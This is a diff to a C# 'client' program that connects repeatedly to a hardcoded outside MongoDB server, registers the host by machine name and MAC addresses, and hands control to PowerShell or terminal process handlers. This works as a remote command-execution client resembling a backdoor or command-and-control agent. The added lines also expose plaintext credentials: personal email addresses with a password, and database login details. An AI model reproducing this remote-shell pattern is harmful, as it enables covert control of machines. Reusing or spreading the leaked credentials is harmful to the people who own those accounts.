@@ -4,6 +4,7 @@ using System;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace client
 {
@@ -11,83 +12,96 @@ namespace client
     {
         static void Main(String[] args)
         {
-            try
+            while(true)
             {
-                string mac = Environment.MachineName.ToString().Trim();
-                NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
-                foreach (NetworkInterface adapter in adapters)
-                {
-                    IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
-                    GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
-                    if (addresses.Count > 0)
-                    {
-                        foreach (GatewayIPAddressInformation address in addresses)
-                        {
-                            mac = mac + "@" + adapter.GetPhysicalAddress().ToString().Trim();
-                        }
-                    }
-                }
                 string databaseip = "194.5.177.152";
                 string databaseport = "27017";
-                mac = mac.Trim();
-                Console.WriteLine(mac);
-                BsonDocument doc = new BsonDocument();
-                doc.Add(new BsonElement("name", "server"));
-                doc.Add(new BsonElement("command", ""));
-                var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
-                IMongoDatabase commandsdatabase = dbClient1.GetDatabase("commands");
-                commandsdatabase.DropCollection(mac);
-                var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
-                commandsdatabase.DropCollection(mac);
-                commandscollection.InsertOne(doc);
-
-
-                while (true)
+                string myemail = "muhammadbozorgi@gmail.com";
+                string myemailpass = "23676653";
+                string myadminemail = "mohammadbozorgi0@gmail.com";
+                string databseusername = "server";
+                string databasepass = "server99";
+                string mac = Environment.MachineName.ToString().Trim();
+                try
                 {
-                    using (TcpClient tcpClient = new TcpClient())
+                    while (true)
                     {
-                        Ping p1 = new Ping();
-                        PingReply PR = p1.Send("8.8.8.8");
-                        try
+                        using (TcpClient tcpClient = new TcpClient())
                         {
-                            tcpClient.Connect("194.5.177.152", 27017);
-                            tcpClient.Close();
-                            break;
-                        }
-                        catch (Exception)
-                        {
-                            if (PR.Status.ToString().Equals("Success"))
+                            Ping p1 = new Ping();
+                            PingReply PR = p1.Send("8.8.8.8");
+                            try
                             {
-                                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-                                {
-                                    Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
-
-                                }
-                                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-                                {
-                                    Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
-                                }
+                                tcpClient.Connect("194.5.177.152", 27017);
+                                tcpClient.Close();
+                                break;
                             }
-                            Console.WriteLine("No internet please connect to internet first ");
+                            catch (Exception)
+                            {
+                                if (PR.Status.ToString().Equals("Success"))
+                                { 
+                                        Console.WriteLine("Port closed please open 27017 port for connecting to mydatabase");
+                                }
+                                Console.WriteLine("No internet please connect to internet first ");
+                                Thread.Sleep(5000);
+                            }
                         }
                     }
+                    NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
+                    foreach (NetworkInterface adapter in adapters)
+                    {
+                        IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
+                        GatewayIPAddressInformationCollection addresses = adapterProperties.GatewayAddresses;
+                        if (addresses.Count > 0)
+                        {
+                            foreach (GatewayIPAddressInformation address in addresses)
+                            {
+                                mac = mac + "@" + adapter.GetPhysicalAddress().ToString().Trim();
+                            }
+                        }
+                    }
+                    Console.WriteLine(mac);
+
+                    BsonDocument doc = new BsonDocument();
+                    doc.Add(new BsonElement("name", "server"));
+                    doc.Add(new BsonElement("command", ""));
+                    var dbClient1 = new MongoClient("mongodb://"+databseusername+":"+databasepass+"@" + databaseip + ":" + databaseport + "/admin");
+                    IMongoDatabase commandsdatabase = dbClient1.GetDatabase("commands");
+                    commandsdatabase.DropCollection(mac);
+                    var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
+                    commandscollection.InsertOne(doc);
+                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                    {
+
+                        ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(databaseip, databaseport, mac, myemail, myemailpass, myadminemail,databseusername,databasepass);
+                    }
+
+                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+                    {
+
+                        ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(databaseip, databaseport, mac, myemail, myemailpass, myadminemail,databseusername,databasepass);
+                    }
                 }
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                catch (Exception ex)
                 {
+                    try
+                    {
+                        BsonDocument doc1 = new BsonDocument();
+                        doc1.Add(new BsonElement("error", ex.ToString()));
+                        var dbClient1 = new MongoClient("mongodb://server:server99@" + databaseip + ":" + databaseport + "/admin");
+                        IMongoDatabase commandsdatabase = dbClient1.GetDatabase("clienterror");
+                        var commandscollection = commandsdatabase.GetCollection<BsonDocument>(mac);
+                        commandscollection.InsertOne(doc1);
+                        Console.WriteLine(ex.GetType().ToString());
 
-                    ProcessAsyncStreamSamples.Powershell.CreatePowershellprocess(databaseip, databaseport, mac);
-                }
-
-                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
-                {
-
-                    ProcessAsyncStreamSamples.Terminal.CreateTerminalprocess(databaseip, databaseport, mac);
+                    }
+                    catch(Exception ex1)
+                    {
+                        Console.WriteLine("I try to send error to database but I cant the error is: "+ex1.GetType().ToString());
+                    }
                 }
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-            }
+             
         }
     }
 }
